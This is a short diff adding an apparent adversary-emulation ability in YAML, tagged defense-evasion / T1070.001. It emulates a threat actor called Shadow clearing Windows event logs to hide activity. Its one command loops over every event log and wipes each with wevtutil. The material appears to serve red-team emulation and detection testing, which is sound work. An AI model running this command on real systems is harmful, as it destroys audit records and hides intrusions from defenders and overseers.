@@ -1,0 +1,13 @@
+- id: 612b6cfa-4ebe-4e50-bb1f-9feff9f4aaah
+  name: "[SHADOW-TWELVE] Specific event log clearing"
+  description: "Shadow очищает конкретные события в журнале событий Windows, чтобы скрыть свои действия."
+  tactic: defense-evasion
+  technique:
+    attack_id: T1070.001
+    name: "Indicator Removal on Host: Clear Event Logs"
+  platforms:
+    windows:
+      psh:
+        command: |
+          cmd.exe /c for /F «tokens=*» %1 in (‘wevtutil.exe el’) DO wevtutil.exe cl «%1»
+        timeout: 90
